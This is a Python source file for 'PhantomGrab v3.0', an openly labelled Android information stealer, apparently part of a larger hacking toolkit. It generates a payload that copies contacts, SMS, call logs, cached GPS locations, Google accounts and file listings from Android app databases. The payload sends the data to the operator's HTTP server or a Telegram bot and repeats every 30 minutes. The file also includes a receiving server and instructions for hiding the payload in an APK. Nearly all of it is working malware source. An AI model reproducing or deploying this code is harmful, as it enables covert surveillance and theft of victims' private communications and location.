#!/usr/bin/env python3
"""
██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
PhantomGrab v3.0 - Advanced Android Info Stealer Engine
"""

import os
import sys
import time
import json
import requests
import threading
import subprocess
import sqlite3
import re
from datetime import datetime

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../..'))
from core.colors import colors


class PhantomGrab:
    """Advanced Android Information Stealer"""
    
    def __init__(self):
        self.target_ip = ''
        self.telegram_token = ''
        self.telegram_chat_id = ''
        self.webhook_url = ''
        self.server_port = 8877
        self.stealer_code = ''
        self.exfil_method = 'http'  # http, telegram, or both
        self.running = False
        self.server = None
    
    def banner(self):
        print(f"""
{colors.RED}╔══════════════════════════════════════════════════╗
║{colors.CYAN}   ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗{colors.RED}║
║{colors.CYAN}  ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║{colors.RED}║
║{colors.CYAN}  ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║{colors.RED}║
║{colors.CYAN}  ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║{colors.RED}║
║{colors.CYAN}  ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║{colors.RED}║
║{colors.CYAN}  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝{colors.RED}║
║{colors.GREEN}          Info Stealer - SMS, Contacts, GPS, Files, Call Logs{colors.RED}      ║
╚══════════════════════════════════════════════════╝{colors.RESET}
        """)
    
    def get_config(self):
        """Get configuration"""
        print(f"\n{colors.CYAN}[+] Configuring PhantomGrab...{colors.RESET}")
        
        # Exfiltration method
        print(f"\n{colors.YELLOW}Select exfiltration method:{colors.RESET}")
        print(f"  {colors.GREEN}[1]{colors.RESET} HTTP Server (receive data locally)")
        print(f"  {colors.GREEN}[2]{colors.RESET} Telegram Bot")
        print(f"  {colors.GREEN}[3]{colors.RESET} Both")
        
        choice = input(f"\n{colors.YELLOW}[?] Choice [1]: {colors.RESET}").strip() or '1'
        
        if choice == '2':
            self.exfil_method = 'telegram'
            self.telegram_token = input(f"{colors.YELLOW}[?] Telegram Bot Token: {colors.RESET}").strip()
            self.telegram_chat_id = input(f"{colors.YELLOW}[?] Telegram Chat ID: {colors.RESET}").strip()
        elif choice == '3':
            self.exfil_method = 'both'
            self.telegram_token = input(f"{colors.YELLOW}[?] Telegram Bot Token: {colors.RESET}").strip()
            self.telegram_chat_id = input(f"{colors.YELLOW}[?] Telegram Chat ID: {colors.RESET}").strip()
        else:
            self.exfil_method = 'http'
        
        # Server port
        if self.exfil_method in ('http', 'both'):
            port = input(f"{colors.YELLOW}[?] Server Port [8877]: {colors.RESET}").strip()
            self.server_port = int(port) if port else 8877
        
        return True
    
    def generate_payload(self):
        """Generate the info stealer payload"""
        # Server URL
        try:
            import socket
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
        except:
            local_ip = 'YOUR_IP'
        
        server_url = f"http://{local_ip}:{self.server_port}"
        
        # Telegram config
        tg_token = self.telegram_token
        tg_chat = self.telegram_chat_id
        
        # Build the Python stealer script
        self.stealer_code = f'''#!/usr/bin/env python3
# PhantomGrab - Android Info Stealer
# Target: Android Device

import os,sys,json,time,base64,urllib.request,ssl,subprocess,sqlite3,re,shutil
from datetime import datetime
from urllib.parse import urlencode

# ===== CONFIG =====
SERVER_URL = "{server_url}"
TELEGRAM_TOKEN = "{tg_token}"
TELEGRAM_CHAT_ID = "{tg_chat}"
EXFIL_METHOD = "{self.exfil_method}"
# =================

# Disable SSL warnings
try:
    import warnings
    warnings.filterwarnings('ignore')
except:
    pass

# Create SSL context
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def send_http(data, endpoint="/collect"):
    """Send data to HTTP server"""
    try:
        encoded = urlencode({{"data": json.dumps(data)}}).encode()
        req = urllib.request.Request(SERVER_URL + endpoint, data=encoded)
        urllib.request.urlopen(req, timeout=10, context=ctx)
    except:
        pass

def send_telegram(message):
    """Send via Telegram"""
    if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
        return
    try:
        url = f"https://api.telegram.org/bot{{TELEGRAM_TOKEN}}/sendMessage"
        data = urlencode({{
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }}).encode()
        urllib.request.urlopen(url, data=data, timeout=10, context=ctx)
    except:
        pass

def collect_device_info():
    """Collect device information"""
    info = {{
        "type": "device_info",
        "timestamp": datetime.now().isoformat()
    }}
    
    # Basic info
    info["hostname"] = os.uname().nodename if hasattr(os, 'uname') else "Unknown"
    info["platform"] = sys.platform
    
    # Android specific
    try:
        build_props = {{}}
        if os.path.exists("/system/build.prop"):
            with open("/system/build.prop", "r", errors="ignore") as f:
                for line in f:
                    if "=" in line:
                        k,v = line.strip().split("=", 1)
                        build_props[k] = v
        info["build_props"] = build_props
    except:
        pass
    
    # Storage info
    try:
        stat = os.statvfs("/")
        info["storage_total"] = stat.f_frsize * stat.f_blocks
        info["storage_free"] = stat.f_frsize * stat.f_bfree
    except:
        pass
    
    # Installed packages
    try:
        result = subprocess.run(["pm", "list", "packages"], capture_output=True, text=True, timeout=10)
        packages = [p.replace("package:", "") for p in result.stdout.strip().split("\\n") if p]
        info["installed_packages"] = packages[:50]  # First 50
    except:
        pass
    
    return info

def collect_contacts():
    """Collect contacts from database"""
    contacts = {{"type": "contacts", "data": []}}
    
    db_paths = [
        "/data/data/com.android.providers.contacts/databases/contacts2.db",
        "/data/data/com.android.providers.contacts/databases/contacts.db",
    ]
    
    for db_path in db_paths:
        if os.path.exists(db_path):
            try:
                shutil.copy(db_path, "/tmp/contacts_temp.db")
                conn = sqlite3.connect("/tmp/contacts_temp.db")
                cursor = conn.cursor()
                
                # Try different table names
                tables = ["contacts", "raw_contacts", "data", "phone_lookup"]
                for table in tables:
                    try:
                        cursor.execute(f"SELECT * FROM {{table}} LIMIT 100")
                        columns = [desc[0] for desc in cursor.description]
                        rows = cursor.fetchall()
                        for row in rows:
                            entry = dict(zip(columns, row))
                            # Convert non-serializable
                            for k,v in entry.items():
                                if isinstance(v, bytes):
                                    entry[k] = base64.b64encode(v).decode()
                            contacts["data"].append(entry)
                    except:
                        pass
                
                conn.close()
                os.remove("/tmp/contacts_temp.db")
            except:
                pass
    
    return contacts

def collect_sms():
    """Collect SMS messages"""
    sms = {{"type": "sms", "data": []}}
    
    db_paths = [
        "/data/data/com.android.providers.telephony/databases/mmssms.db",
    ]
    
    for db_path in db_paths:
        if os.path.exists(db_path):
            try:
                shutil.copy(db_path, "/tmp/sms_temp.db")
                conn = sqlite3.connect("/tmp/sms_temp.db")
                cursor = conn.cursor()
                
                try:
                    cursor.execute("SELECT * FROM sms LIMIT 200")
                    columns = [desc[0] for desc in cursor.description]
                    rows = cursor.fetchall()
                    for row in rows:
                        entry = dict(zip(columns, row))
                        for k,v in entry.items():
                            if isinstance(v, bytes):
                                entry[k] = base64.b64encode(v).decode()
                        sms["data"].append(entry)
                except:
                    pass
                
                conn.close()
                os.remove("/tmp/sms_temp.db")
            except:
                pass
    
    return sms

def collect_call_logs():
    """Collect call logs"""
    calls = {{"type": "call_logs", "data": []}}
    
    db_paths = [
        "/data/data/com.android.providers.contacts/databases/calllog.db",
        "/data/data/com.android.providers.contacts/databases/calls.db",
    ]
    
    for db_path in db_paths:
        if os.path.exists(db_path):
            try:
                shutil.copy(db_path, "/tmp/calls_temp.db")
                conn = sqlite3.connect("/tmp/calls_temp.db")
                cursor = conn.cursor()
                
                try:
                    cursor.execute("SELECT * FROM calls LIMIT 200")
                    columns = [desc[0] for desc in cursor.description]
                    rows = cursor.fetchall()
                    for row in rows:
                        entry = dict(zip(columns, row))
                        for k,v in entry.items():
                            if isinstance(v, bytes):
                                entry[k] = base64.b64encode(v).decode()
                        calls["data"].append(entry)
                except:
                    pass
                
                conn.close()
                os.remove("/tmp/calls_temp.db")
            except:
                pass
    
    return calls

def collect_gps():
    """Collect GPS location from various sources"""
    gps = {{"type": "gps", "data": {{}}}}
    
    # Try to get from Android location providers
    try:
        # Check for cached locations
        paths = [
            "/data/data/com.google.android.gms/databases/location_cache.db",
            "/data/data/com.android.location.fused/databases/location.db",
        ]
        for p in paths:
            if os.path.exists(p):
                shutil.copy(p, "/tmp/gps_temp.db")
                conn = sqlite3.connect("/tmp/gps_temp.db")
                cursor = conn.cursor()
                try:
                    cursor.execute("SELECT * FROM location LIMIT 50")
                    columns = [desc[0] for desc in cursor.description]
                    for row in cursor.fetchall():
                        entry = dict(zip(columns, row))
                        for k,v in entry.items():
                            if isinstance(v, bytes):
                                entry[k] = base64.b64encode(v).decode()
                        gps["data"] = entry
                except:
                    pass
                conn.close()
                os.remove("/tmp/gps_temp.db")
    except:
        pass
    
    return gps

def collect_whatsapp():
    """Collect WhatsApp data if available"""
    wa = {{"type": "whatsapp", "data": []}}
    
    wa_paths = [
        "/data/data/com.whatsapp/databases/msgstore.db",
        "/data/data/com.whatsapp/databases/wa.db",
        "/sdcard/Android/media/com.whatsapp/WhatsApp/Databases/msgstore.db.crypt14",
    ]
    
    for p in wa_paths:
        if os.path.exists(p):
            size = os.path.getsize(p)
            wa["data"].append({{"path": p, "size": size}})
    
    return wa

def collect_files():
    """Collect file listing"""
    files = {{"type": "files", "data": []}}
    
    scan_dirs = [
        "/sdcard/DCIM",
        "/sdcard/Documents",
        "/sdcard/Download",
        "/sdcard/Pictures",
        "/sdcard/WhatsApp",
    ]
    
    for d in scan_dirs:
        if os.path.exists(d):
            try:
                for root, dirs, filenames in os.walk(d):
                    for f in filenames[:20]:  # Limit per directory
                        try:
                            fpath = os.path.join(root, f)
                            size = os.path.getsize(fpath)
                            mod = datetime.fromtimestamp(os.path.getmtime(fpath)).isoformat()
                            files["data"].append({{
                                "path": fpath,
                                "size": size,
                                "modified": mod
                            }})
                        except:
                            pass
            except:
                pass
    
    return files

def collect_accounts():
    """Collect saved accounts"""
    accounts = {{"type": "accounts", "data": []}}
    
    db_path = "/data/data/com.google.android.gms/databases/accounts.db"
    if os.path.exists(db_path):
        try:
            shutil.copy(db_path, "/tmp/acc_temp.db")
            conn = sqlite3.connect("/tmp/acc_temp.db")
            cursor = conn.cursor()
            try:
                cursor.execute("SELECT * FROM accounts LIMIT 50")
                columns = [desc[0] for desc in cursor.description]
                for row in cursor.fetchall():
                    entry = dict(zip(columns, row))
                    accounts["data"].append(entry)
            except:
                pass
            conn.close()
            os.remove("/tmp/acc_temp.db")
        except:
            pass
    
    return accounts

def steal_all():
    """Run all collection and exfiltrate"""
    results = []
    
    print("[+] PhantomGrab Activated")
    print("[+] Collecting device information...")
    results.append(collect_device_info())
    
    print("[+] Collecting contacts...")
    results.append(collect_contacts())
    
    print("[+] Collecting SMS...")
    results.append(collect_sms())
    
    print("[+] Collecting call logs...")
    results.append(collect_call_logs())
    
    print("[+] Collecting GPS...")
    results.append(collect_gps())
    
    print("[+] Collecting WhatsApp data...")
    results.append(collect_whatsapp())
    
    print("[+] Collecting files...")
    results.append(collect_files())
    
    print("[+] Collecting accounts...")
    results.append(collect_accounts())
    
    # Exfiltrate
    for data in results:
        if EXFIL_METHOD in ("http", "both"):
            send_http(data)
        if EXFIL_METHOD in ("telegram", "both"):
            data_type = data.get("type", "unknown")
            data_count = len(data.get("data", []))
            msg = f"📱 PhantomGrab | {{data_type}}\\nTarget: {{os.uname().nodename if hasattr(os, 'uname') else 'Android'}}\\nItems: {{data_count}}\\nTime: {{datetime.now().isoformat()}}"
            try:
                msg += f"\\nData: {{json.dumps(data)[:3500]}}"
            except:
                pass
            send_telegram(msg)
    
    # Send final summary via Telegram
    if EXFIL_METHOD in ("telegram", "both"):
        summary = f"📊 PhantomGrab COMPLETE\\n"
        for data in results:
            data_type = data.get("type", "unknown")
            data_count = len(data.get("data", []))
            summary += f"  • {{data_type}}: {{data_count}} items\\n"
        send_telegram(summary)
    
    print("[+] Exfiltration complete!")
    
    # Keep running for persistence
    return results

if __name__ == "__main__":
    # Run immediately
    steal_all()
    
    # Persistence - re-run every 30 minutes
    import threading
    def repeat():
        while True:
            time.sleep(1800)
            steal_all()
    
    t = threading.Thread(target=repeat, daemon=True)
    t.start()
    t.join()
'''
        return self.stealer_code
    
    def save_payload(self):
        """Save the generated payload"""
        output_dir = os.path.join(os.path.dirname(__file__), '../../output')
        os.makedirs(output_dir, exist_ok=True)
        
        filename = f"phantom_grab_{datetime.now().strftime('%Y%m%d_%H%M%S')}.py"
        filepath = os.path.join(output_dir, filename)
        
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(self.stealer_code)
        
        # Also create a .sh wrapper for Android
        sh_path = filepath.replace('.py', '.sh')
        with open(sh_path, 'w') as f:
            f.write(f'''#!/bin/bash
# PhantomGrab Android Launcher
# Run on target device with: python3 {filename}
echo "[+] Launching PhantomGrab..."
cd "$(dirname "$0")"
python3 {filename}
''')
        os.chmod(sh_path, 0o755)
        
        print(f"\n{colors.GREEN}[+] Payload generated!{colors.RESET}")
        print(f"  ├─ {colors.CYAN}Python:{colors.RESET} {filepath}")
        print(f"  ├─ {colors.CYAN}Shell:{colors.RESET} {sh_path}")
        
        return filepath
    
    def start_http_server(self):
        """Start HTTP server to receive exfiltrated data"""
        from http.server import HTTPServer, BaseHTTPRequestHandler
        
        class GrabHandler(BaseHTTPRequestHandler):
            data_dir = os.path.join(os.path.dirname(__file__), '../../output/stolen_data')
            
            def do_POST(self):
                content_length = int(self.headers.get('Content-Length', 0))
                body = self.rfile.read(content_length).decode()
                
                from urllib.parse import parse_qs
                params = parse_qs(body)
                data_raw = params.get('data', ['{}'])[0]
                
                try:
                    data = json.loads(data_raw)
                    data_type = data.get('type', 'unknown')
                    
                    # Save to file
                    os.makedirs(self.data_dir, exist_ok=True)
                    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                    filename = f"{data_type}_{timestamp}.json"
                    filepath = os.path.join(self.data_dir, filename)
                    
                    with open(filepath, 'w') as f:
                        json.dump(data, f, indent=2, default=str)
                    
                    # Print notification
                    item_count = len(data.get('data', []))
                    print(f"\n{colors.GREEN}═══════════════════════════════════════{colors.RESET}")
                    print(f"{colors.GREEN}[📥] Received: {data_type}{colors.RESET}")
                    print(f"{colors.CYAN}  Items:{colors.RESET} {item_count}")
                    print(f"{colors.CYAN}  Saved:{colors.RESET} {filepath}")
                    print(f"{colors.GREEN}═══════════════════════════════════════{colors.RESET}")
                    
                    # Send to Telegram too if configured
                    if TELEGRAM_TOKEN and TELEGRAM_CHAT_ID:
                        try:
                            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
                            msg = f"📥 PhantomGrab | {data_type}\\nItems: {item_count}\\nFile: {filename}"
                            req_data = urlencode({"chat_id": TELEGRAM_CHAT_ID, "text": msg}).encode()
                            urllib.request.urlopen(url, data=req_data, timeout=5)
                        except:
                            pass
                    
                except Exception as e:
                    print(f"{colors.RED}[!] Error processing data: {e}{colors.RESET}")
                
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(b'{"status":"ok"}')
            
            def do_GET(self):
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                
                # Status page
                status = {
                    'status': 'active',
                    'time': datetime.now().isoformat(),
                    'total_received': len(os.listdir(self.data_dir)) if os.path.exists(self.data_dir) else 0,
                    'data_dir': self.data_dir
                }
                self.wfile.write(json.dumps(status, indent=2).encode())
            
            def log_message(self, format, *args):
                pass  # Suppress logs
        
        # Set Telegram config on handler
        GrabHandler.telegram_token = self.telegram_token
        GrabHandler.telegram_chat_id = self.telegram_chat_id
        TELEGRAM_TOKEN = self.telegram_token
        TELEGRAM_CHAT_ID = self.telegram_chat_id
        
        print(f"\n{colors.GREEN}[+] Starting PhantomGrab HTTP server...{colors.RESET}")
        print(f"  ├─ {colors.CYAN}URL:{colors.RESET} http://0.0.0.0:{self.server_port}")
        print(f"  ├─ {colors.CYAN}Data dir:{colors.RESET} {os.path.abspath(GrabHandler.data_dir)}")
        print(f"  └─ {colors.CYAN}Dashboard:{colors.RESET} http://localhost:{self.server_port}")
        
        server = HTTPServer(('0.0.0.0', self.server_port), GrabHandler)
        self.running = True
        
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            print(f"\n{colors.YELLOW}[!] Server stopped.{colors.RESET}")
            server.shutdown()
    
    def run(self):
        """Main execution"""
        os.system('clear' if os.name == 'posix' else 'cls')
        self.banner()
        
        if not self.get_config():
            return
        
        self.generate_payload()
        self.save_payload()
        
        print(f"\n{colors.YELLOW}[!] Payload Instructions:{colors.RESET}")
        print(f"  1. Copy the payload to target device")
        print(f"  2. Run: python3 {os.path.basename(self.save_payload())}")
        print(f"  3. Or wrap it in an APK with APK Binder")
        print(f"\n{colors.YELLOW}[?] Start HTTP server to receive data? (Y/n):{colors.RESET}")
        if input().strip().lower() != 'n':
            self.start_http_server()
